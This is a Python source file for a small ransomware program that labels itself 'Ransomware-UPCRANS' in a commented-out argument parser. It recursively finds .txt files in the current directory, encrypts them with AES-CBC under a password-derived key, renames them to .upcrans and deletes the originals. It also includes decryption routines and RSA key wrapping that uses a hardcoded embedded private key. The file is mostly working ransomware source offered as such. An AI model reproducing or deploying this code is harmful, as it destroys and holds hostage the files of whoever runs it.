from Crypto import Random
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import os, sys, struct
import argparse

if sys.version_info >= (3, 8, 0):
        import time
        time.clock = time.process_time


SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
qPYmZW+TQjtrx4tG7ZHda65+EdyVJkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdP
GhYcIZmJ7iT5aRCkXiKXrw+iIL6DT0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4re
q/CydAWrsAJPhtEmObu6cn2FYFfwGmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkz
vvYVc85DbQFK/Jcpeq0QkKiJ4Z+TWGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZg
HwIDAQAB
-----END PUBLIC KEY-----''' 
SERVER_PRIVATE_RSA_KEY = '''-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAklmKLXGK6jfMis4ifjlBxSGMFCj1RtSA/sQxs4I5IWvMxYSD
1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXTqPYmZW+TQjtrx4tG7ZHda65+EdyV
Jkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdPGhYcIZmJ7iT5aRCkXiKXrw+iIL6D
T0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4req/CydAWrsAJPhtEmObu6cn2FYFfw
GmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkzvvYVc85DbQFK/Jcpeq0QkKiJ4Z+T
WGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZgHwIDAQABAoIBAFLE80IaSi+HGVaT
mKx8o3bjLz8jnvzNKJttyJI2nysItcor1Qh1IQZ+Dhj6ZmcV4mGXF2hg6ZfES3hW
mL3pZRjVBgguX0GBK8ayPY4VBf5ltIVTlMMRJlGvJEmZf49pWdhjc0Mu1twZRmKq
nVpWy8T8JjLWjEy0ep5yPBPFSrZFphQdiZxTrnmNR/Ip48XXGnQtRuNGSsNattc/
2UYmLjSYTPasSV7PeXtGGaw34dfiKKlh4anXzjl1ARcVEgDRG617y8eK3aGDpU5G
5bm/M4kZ7xXVtrPuAlhcZPgPrPG2VH9/DTc1IzEXG65pAwC+WhCZv3xFRTYTz9ca
qj4sYKkCgYEA+eBkkFb7K/t3JfE9AGwNBdmXepdgVOiBbKBxwXl4XbjTQn1BGCsQ
0FmgaFUhL3SmDYvNuNnF1kFeXOlghMR4v1DOSttcrqEU0oztLDdY1PKxHBusp2oy
RvK+JPZVMt8yRQkPWjVlSKWWgqO+Yd5QONWMKAfA1f3zCa1Rj/1ouwMCgYEAle+r
QDIWri6e/mdim/ec/irpCRBn/2XTK1J0kqog1vmovIhhxHlTw7bb/S168afYY8v8
TUJgKgnqGYmo/RVreMs+IZoN8ZoqkKBRRC00C/EpiDSv4q8EfHgzAP3Jpfk29brc
QxEkClaXssRG/N8bK2aiUgztM4HabFSocWW5DbUCgYAcMQbnigi4g5yDuV3qiEZH
3K7Mc/u4WKsReGCdNXkxCcM8Aymu8lzpRNNmMgSWeBCsApPpQRii/akJzoLHN+tv
mkxMAcfJI/9XafLwRCZPkDoPM8gc80xM2OI/BVPDc48WXtlOkiulMJl0j8jQ/eYL
I3y2n3lQK2CaPOWw2yRPxQKBgHcpshslM+1fVDGxDSgUFYvTor33chADZ19I+ykN
WWhBp5+fbMRwAOjNTe3b1Zh14379QhpNJIyEsK93Pv1VpsKsFUczXt2jvyyOncfn
fTP4iR+dcCRjINej2DVzfm4QsWN/DUuoNdKZm5sSb7DNyJQnz94SM/r5uxTZ+72U
MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
14roox6zaAk8fEZ/nkS86evh6PqjfhSuniBoqvQllAPZTXdOm8KPchNU8VC+iSzw
+IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
-----END RSA PRIVATE KEY-----'''

"""
def parse_args():
    parser = argparse.ArgumentParser(description='Ransomware-UPCRANS')
    parser.add_argument('-p', '--path', help='Path to start attack. Default path = %%HOME%%/', action="store")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Start attack',
                        action='store_true')
    group.add_argument('-d', '--decrypt', help='Decrypt files',
                        action='store_true')

    return parser.parse_args()
"""

# Encrypt KEY (AES) with public key.
def encrypt_key(AESkey, key):
    public_key = RSA.importKey(key)
    encryptor = PKCS1_OAEP.new(public_key)
    encrypted_key = encryptor.encrypt(AESkey)
    return encrypted_key


# Decrypt KEY (AES) with private key.
def decrypt_key(AESkey, key):
    private_key = RSA.importKey(key)
    decryptor = PKCS1_OAEP.new(private_key)
    decrypted_key = decryptor.decrypt(AESkey)
    return decrypted_key


# List files of a system
def list_files(option):
    path = '.'
    if option == 1:
        extensions = ['txt']

        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if file.split('.')[-1] in extensions:
                    files.append(os.path.join(r, file))
    else:  
        extensions = ['upcrans']

        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if file.split('.')[-1] in extensions:
                    files.append(os.path.join(r, file)) 
    return files


# Encrypt function
def encrypt(filename, infile, outfile, key):
    block_size = AES.block_size #AES block_size = 16 
    chunk_size = block_size*1024 

    filesize = os.path.getsize(filename)
    outfile.write(struct.pack('<Q', filesize))

    iv = Random.new().read(block_size)
    outfile.write(iv)

    encr = AES.new(key, AES.MODE_CBC, iv)

    end_file = False

    while not end_file:
        chunk = infile.read(chunk_size)
        if len(chunk) == 0:
            break        
        elif len(chunk) % block_size != 0:
            end_file = True
            padding_length = (block_size - len(chunk) % block_size) or block_size
            chunk += (padding_length * chr(padding_length)).encode()

        outfile.write(encr.encrypt(chunk))
    
    
# Encrypt file
def encrypt_file(l_files, key):
    for filename in l_files:
        with open(filename, 'rb') as fi:
            with open(filename + ".upcrans", 'wb') as fo:
                encrypt(filename, fi, fo, key)
        print ("File encrypted\n" ,filename,"===>" ,filename+".upcrans")
        os.remove(filename)


# Decrypt function
def decrypt(infile, outfile, key):
    block_size = AES.block_size #AES block_size = 16 
    chunk_size = block_size*1024 

    size_orig = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]   
    iv = infile.read(16)

    decr = AES.new(key, AES.MODE_CBC, iv)

    end_file = False

    while not end_file:
        chunk = infile.read(chunk_size)
        if len(chunk) == 0:
            break        
        elif len(chunk) % block_size != 0:
            end_file = True
            padding_length = (block_size - len(chunk) % block_size) or block_size
            chunk += (padding_length * chr(padding_length)).encode()

        outfile.write(decr.decrypt(chunk))
    outfile.truncate(size_orig)


# Decrypt file
def decrypt_file(l_files, key):
    for file_name in l_files:
        print(file_name)
        with open(file_name, 'rb') as fi:
            filename, filextensions = os.path.splitext(file_name)
            with open(filename, 'wb') as fo:
                decrypt(fi, fo, key)
        print ("File decrypted\n" ,filename)
        os.remove(file_name)

        
# hash pasword to get 16 bytes key.
def getKey(password):
    hasher = SHA256.new(password.encode())
    return hasher.digest()


def main():   
    option = int(sys.argv[1])
    l_files = list_files(option)

    if option == 1:
        password = input("Enter the password >>> ")
        encrypt_file(l_files, getKey(password))

    elif option == 2:
        password = input("Enter the password >>> ")
        decrypt_file(l_files, getKey(password))

    elif option == 3:
        password = input("Enter the password >>> ")
        res = encrypt_key(getKey(password), SERVER_PUBLIC_RSA_KEY)
        res = decrypt_key(res, SERVER_PRIVATE_RSA_KEY)

    else:
        print("No option selected")   
   

if __name__ == "__main__":
    main()